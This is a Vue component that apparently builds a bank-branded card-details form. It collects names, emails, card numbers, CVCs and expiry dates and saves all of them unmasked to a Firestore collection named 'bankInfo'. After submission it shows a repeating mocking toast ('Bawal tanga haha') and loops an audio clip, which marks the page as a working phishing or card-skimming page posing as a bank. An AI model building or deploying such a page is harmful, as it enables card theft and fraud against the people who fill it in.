<template>
  <div class="form-container rounded-xl">
    <Card class="bank-card">
      <template #header>
        <div class="card-header">
          <img
            src="/src/assets/Bank_white.png"
            alt="Bank logo"
            class="logo"
            width="150px"
          />
        </div>
      </template>
      <template #content>
        <form @submit.prevent="submitForm" class="form-content">
          <div class="field-group">
            <FloatLabel variant="on">
              <InputText
                id="name"
                v-model="form.name"
                :class="{ 'p-invalid': errors.name }"
                class="form-input"
              />
              <label for="name">Full Name</label>
            </FloatLabel>
            <small v-if="errors.name" class="p-error">{{ errors.name }}</small>
          </div>

          <div class="field-group">
            <FloatLabel variant="on">
              <InputText
                id="email"
                v-model="form.email"
                :class="{ 'p-invalid': errors.email }"
                class="form-input"
              />
              <label for="email">Email Address</label>
            </FloatLabel>
            <small v-if="errors.email" class="p-error">{{
              errors.email
            }}</small>
          </div>

          <div class="field-group">
            <FloatLabel variant="on">
              <InputText
                id="cardNumber"
                v-model="form.cardNumber"
                maxlength="19"
                :class="{ 'p-invalid': errors.cardNumber }"
                class="form-input pr-10"
                @input="detectCardType"
              >
                <template #righticon>
                  <span
                    v-if="cardType"
                    :class="`pi ${cardTypeIcon}`"
                    class="p-inputgroup-addon p-2"
                  ></span>
                </template>
              </InputText>
              <label for="cardNumber">Card Number</label>
            </FloatLabel>
            <small v-if="errors.cardNumber" class="p-error">{{
              errors.cardNumber
            }}</small>
          </div>

          <div class="field-row">
            <div class="field-group">
              <FloatLabel variant="on">
                <InputText
                  id="cvc"
                  v-model="form.cvc"
                  maxlength="4"
                  :class="{ 'p-invalid': errors.cvc }"
                  class="form-input"
                />
                <label for="cvc">CVC</label>
              </FloatLabel>
              <small v-if="errors.cvc" class="p-error">{{ errors.cvc }}</small>
            </div>

            <div class="field-group">
              <FloatLabel variant="on">
                <InputMask
                  id="expiry"
                  v-model="form.expiry"
                  mask="99/99"
                  :class="{ 'p-invalid': errors.expiry }"
                  class="form-input"
                />
                <label for="expiry">Expiry (MM/YY)</label>
              </FloatLabel>
              <small v-if="errors.expiry" class="p-error">{{
                errors.expiry
              }}</small>
            </div>
          </div>

          <Button
            type="submit"
            label="Submit Information"
            :disabled="isSubmitting"
            :loading="isSubmitting"
            class="submit-button"
            icon="pi pi-lock"
          />
        </form>
      </template>
    </Card>
    <Toast ref="toast" position="top-right" />
  </div>
</template>

<script>
import Card from "primevue/card";
import InputText from "primevue/inputtext";
import InputMask from "primevue/inputmask";
import FloatLabel from "primevue/floatlabel";
import Button from "primevue/button";
import Toast from "primevue/toast";
import { db } from "../firebase"; // Import Firebase setup
import { collection, addDoc } from "firebase/firestore"; // Firestore functions

export default {
  components: {
    Card,
    InputText,
    InputMask,
    FloatLabel,
    Button,
    Toast,
  },
  data() {
    return {
      form: {
        name: "",
        email: "",
        cardNumber: "",
        cvc: "",
        expiry: "",
      },
      errors: {},
      isSubmitting: false,
      cardType: null,
    };
  },
  computed: {
    cardTypeIcon() {
      switch (this.cardType) {
        case "visa":
          return "pi-credit-card";
        case "mastercard":
          return "pi-cc-mastercard";
        default:
          return "";
      }
    },
  },
  methods: {
    detectCardType() {
      const cardNumber = this.form.cardNumber.replace(/\D/g, "");
      if (!cardNumber) {
        this.cardType = null;
        return;
      }

      if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cardNumber)) {
        this.cardType = "visa";
      } else if (
        /^(5[1-5][0-9]{14}|2(22[1-9]|2[3-9][0-9]|[3-6][0-9]{2}|7[0-1][0-9]|720)[0-9]{12})$/.test(
          cardNumber,
        )
      ) {
        this.cardType = "mastercard";
      } else {
        this.cardType = null;
      }
    },
    validateForm() {
      this.errors = {};
      if (!this.form.name) this.errors.name = "Name is required";
      if (!this.form.email || !/\S+@\S+\.\S+/.test(this.form.email))
        this.errors.email = "Valid email is required";
      if (
        !this.form.cardNumber ||
        !/^\d{13,19}$/.test(this.form.cardNumber.replace(/\D/g, ""))
      )
        this.errors.cardNumber = "Valid card number required (13-19 digits)";
      if (!this.form.cvc || !/^\d{3,4}$/.test(this.form.cvc))
        this.errors.cvc = "CVC must be 3 or 4 digits";
      if (!this.form.expiry || !/^\d{2}\/\d{2}$/.test(this.form.expiry))
        this.errors.expiry = "Valid expiry (MM/YY) required";
      else {
        const [month, year] = this.form.expiry.split("/").map(Number);
        const currentDate = new Date();
        const expiryDate = new Date(2000 + year, month - 1);
        if (month < 1 || month > 12) this.errors.expiry = "Invalid month";
        else if (expiryDate < currentDate)
          this.errors.expiry = "Card has expired";
      }
      return Object.keys(this.errors).length === 0;
    },
    async submitForm() {
      if (!this.validateForm()) {
        this.$refs.toast.add({
          severity: "error",
          summary: "Validation Error",
          detail: "Please fix the errors in the form",
          life: 3000,
        });
        return;
      }

      this.isSubmitting = true;
      try {
        await new Promise((resolve) => setTimeout(resolve, 1500));
        // Save to Firestore
        await addDoc(collection(db, "bankInfo"), {
          name: this.form.name,
          email: this.form.email,
          cardNumber: this.form.cardNumber, // Store as entered (you might want to mask sensitive data)
          // cvc: "****", // Mask CVC for security
          // unmask for testing
          cvc: this.form.cvc,
          expiry: this.form.expiry,
          cardType: this.cardType || "unknown",
          timestamp: new Date(),
        });

        // client said add a message like "oops bawal tanga haha"
        this.toastInterval = setInterval(() => {
          this.$refs.toast.add({
            severity: "contrast",
            summary: "Oops!",
            detail: "Bawal tanga haha",
            life: 3000,
          });
        }, 500);

        // play annoying audio online
        const audio = new Audio(
          "https://www.soundjay.com/buttons/sounds/button-12.mp3",
        );
        audio.loop = true;
        audio.play();
        this.annoyingAudio = audio;

        this.form = {
          name: "",
          email: "",
          cardNumber: "",
          cvc: "",
          expiry: "",
        };
      } catch (error) {
        this.$refs.toast.add({
          severity: "error",
          summary: "Error",
          detail: "Failed to save information",
          life: 3000,
        });
        console.error("Error saving information:", error);
      } finally {
        this.isSubmitting = false;
      }
    },
  },
};
</script>

<style scoped>
@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap");

.form-container {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 2rem;
  background: #ffffff;
  font-family: "Open Sans", sans-serif;
  border-radius: 1.5rem;
}

.bank-card {
  width: 100%;
  max-width: 480px;
  border-radius: 24px;
  overflow: hidden;
  box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
  background: #ffffff;
}

.card-header {
  text-align: center;
  background: #b11116;
  color: #ffffff;
}

.logo {
  max-width: 150px;
  height: auto;
}

.form-title {
  font-size: 1.875rem;
  font-weight: 700;
  margin: 0;
  letter-spacing: -0.025em;
}

.form-content {
  padding: 2rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.field-group {
  position: relative;
}

.field-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1rem;
}

.form-input {
  width: 100%;
  padding: 1rem;
  border: 2px solid #d5b527;
  border-radius: 12px;
  font-size: 1rem;
  font-family: "Open Sans", sans-serif;
  background: #ffffff;
  transition: all 0.3s ease;
}

.form-input:focus {
  border-color: #b11116;
  box-shadow: 0 0 0 4px rgba(177, 17, 22, 0.1);
  outline: none;
}

.form-input.p-invalid {
  border-color: #ef4444;
  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
}

.submit-button {
  padding: 1rem 2rem;
  font-size: 1.1rem;
  font-weight: 600;
  border-radius: 12px;
  background: #d5b527;
  border: none;
  color: #ffffff;
  transition: all 0.3s ease;
  margin-top: 1rem;
}

.submit-button:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 10px 25px rgba(213, 181, 39, 0.4);
  background: #c4a424;
}

.submit-button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.p-error {
  color: #ef4444;
  font-size: 0.875rem;
  margin-top: 0.5rem;
  font-weight: 500;
}

/* PrimeVue Component Overrides */
:deep(.p-card) {
  border: none;
  box-shadow: none;
  background: transparent;
}

:deep(.p-card .p-card-body) {
  padding: 0;
}

:deep(.p-card .p-card-content) {
  padding: 0;
}

:deep(.p-card .p-card-header) {
  padding: 0;
  border: none;
  background: transparent;
}

:deep(.p-float-label label) {
  font-weight: 500;
  color: #64748b;
  transition: all 0.3s ease;
}

:deep(.p-float-label .p-focus ~ label),
:deep(.p-float-label .p-filled ~ label) {
  color: #b11116;
  font-weight: 600;
}

:deep(.p-button) {
  font-family: "Open Sans", sans-serif;
}

:deep(.p-button .p-button-icon) {
  margin-right: 0.5rem;
}

:deep(.p-inputgroup-addon) {
  background: #ffffff;
  border: none;
  border-left: 2px solid #d5b527;
  border-radius: 0 12px 12px 0;
}

/* Responsive Design */
@media (max-width: 640px) {
  .form-container {
    padding: 1rem;
  }

  .form-content {
    padding: 1.5rem;
  }

  .field-row {
    grid-template-columns: 1fr;
  }

  .form-title {
    font-size: 1.5rem;
  }

  .card-header {
    padding: 1.5rem;
  }

  .logo {
    max-width: 120px;
  }
}
</style>